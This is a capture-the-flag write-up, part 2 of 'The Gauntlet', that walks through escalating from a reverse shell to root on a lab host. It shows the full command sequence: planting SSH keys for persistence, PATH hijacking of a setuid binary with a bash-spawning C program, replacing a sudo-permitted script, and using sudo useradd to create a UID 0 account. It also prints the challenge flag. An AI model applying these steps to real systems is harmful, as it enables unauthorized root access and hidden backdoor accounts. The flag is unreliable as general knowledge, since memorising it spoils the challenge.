
# The Gauntlet - Part 2

**Challenge Prompt:**

> So, you think you're a l33t h4xx0r? Alright, here's my little gauntlet to you then: Break in through the website and get a shell one way or another. Once that's done, escalate your privileges and own the box. You won't be needing any fancy kernel exploits or such, this one's all about bad practices and misconfigurations. Doesn't sound too hard, now does it? Good luck!

Flag binaries are located at /home/*****/user.flag and /root/root.flag  
the-gauntlet.hkn

## Prerequisites

This writeup will be missing the rabbit holes, and other wrong paths I took. I decided to do this to save time so I can write more writeups. I might decide to write a more complete one later, so this will be a writeup in the mind of someone not doing any mistakes. But I’m happy to talk on the discord to discuss the challenge.

This is part 2 for The Gauntlet challenge, I recommend reading part 1 to understand context.

## SSH

We have reverse shell access, but instead of relying on the reverse shell it’s better to SSH. We saw earlier in the nmap scan that there is port 22 open.

We can add our public key into the file .ssh/authorized_keys that we need to create.

If you do not know how to create SSH keys, I can recommend searching online as there are many guides.

After adding the keys, I can now ssh using the command

```
ssh user1@the-gauntlet.hkn
```

## Escalate privileges

To get an overview of what accounts there are, we can run

```
cat /etc/passwd
```

and we see there are 3 accounts, and first goal is getting access to user3.

```
user1:x:1001:1001:,,,:/home/user1:/bin/bash
user2:x:1002:1002:,,,:/home/user2:/bin/bash
user3:x:1003:1003:,,,:/home/user3:/bin/bash
```

### Getting access to user2

Running `ls -la` in home folder gives us the following output

```
total 1612
drwxr-x--- 1 user1 user1   4096 Mar 15 10:04 .
drwxr-xr-x 1 root  root    4096 Jan 25 20:57 ..
-rw-r--r-- 1 user1 user1    220 Jan 25 20:57 .bash_logout
-rw-r--r-- 1 user1 user1   3771 Jan 25 20:57 .bashrc
drwx------ 2 user1 user1   4096 Mar 15 10:04 .cache
-rw-r--r-- 1 user1 user1    807 Jan 25 20:57 .profile
drwxrwxr-x 2 user1 user1   4096 Mar 15 10:02 .ssh
-rwxrwxrwx 1 root  root    6032 Jan 25 20:56 app.py
-rw-r--r-- 1 user1 user1   8192 Mar 15 09:12 ctf.db
-rwsrwsr-x 1 user2 user2 776520 Jan 25 20:56 testBin
-rwxrwxrwx 1 user1 user1 821008 Jan 25 20:56 user.flag
```

We can see that `testBin` is owned by user2, and also has a setuid bit set.

> The Unix and Linux access rights flags setuid and setgid (short for set user identity and set group identity) allow users to run an executable with the file system permissions of the executable's owner or group respectively and to change behaviour in directories.

So this means the binary can run with permissions of user2 even if we are not user2.

When first running `testBin` we get the following output

```
Usage: ./testBin <file>
```

and when providing a file we get output that seems to be from `xxd`

```
00000000: 2320 5965 732c 2049 2067 6f74 2043 6861  # Yes, I got Cha
...
```

We can abuse the `PATH` variable to check for variables in current directory with following commands.

```
PATH=.:${PATH}
export PATH
```

We can confirm this works by copying the user.flag binary as `xxd`.

```
cp user.flag xxd
```

When running the command `./testBin app.py` it runs the `user.flag` binary instead.

We can create our own binary that runs bash with user2 permissions

```c
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    execve(paramList[0], paramList, NULL);
    return 0;
}
```

Compile with:

```
nano main.c
gcc main.c
cp a.out xxd
chmod +x xxd
```

Run `testBin` again and confirm new shell as user2:

```
uid=1001(user1) gid=1001(user1) euid=1002(user2) egid=1002(user2) groups=1002(user2),100(users),1001(user1)
```

### Getting access to user3

```
ls -la
```

Output:

```
drwxr-xr-x 1 user2 user2 4096 Mar 15 10:57 .
...
-rwxrwxr-x 1 root  root    58 Jan 25 20:56 runMe.sh
```

Running `runMe.sh`:

```
If only I could be something useful...
```

Check sudo privileges:

```
sudo -l
```

Output:

```
(user3) NOPASSWD: /home/user2/runMe.sh
```

We can delete and replace `runMe.sh`:

```
rm runMe.sh
echo "id" > runMe.sh
chmod +x runMe.sh
```

Run as user3:

```
sudo -u user3 /home/user2/runMe.sh
```

Output:

```
uid=1003(user3) gid=1003(user3) groups=1003(user3),100(users)
```

To persist access:

```bash
cd ../user3
mkdir .ssh
cd .ssh
echo "public_key_here" > authorized_keys
```

Then:

```
ssh user3@the-gauntlet.hkn
```

## Getting Root

Check sudo again:

```
sudo -l
```

Output:

```
(root) NOPASSWD: /usr/sbin/useradd *
```

Create a new user with root privileges:

```
sudo -u root useradd -o --uid 0 --gid 0 user4 --password $(echo password | openssl passwd -6 -stdin)
```

Switch user:

```
su user4
```

Password: `password`

Confirm:

```
uid=0(root) gid=0(root) groups=0(root)
```

Final flag:

```
./root/root.flag
```

Output:

```
DDC{1_h0p3_y0u_enj0y3d_my_f1r27_B2R}
```
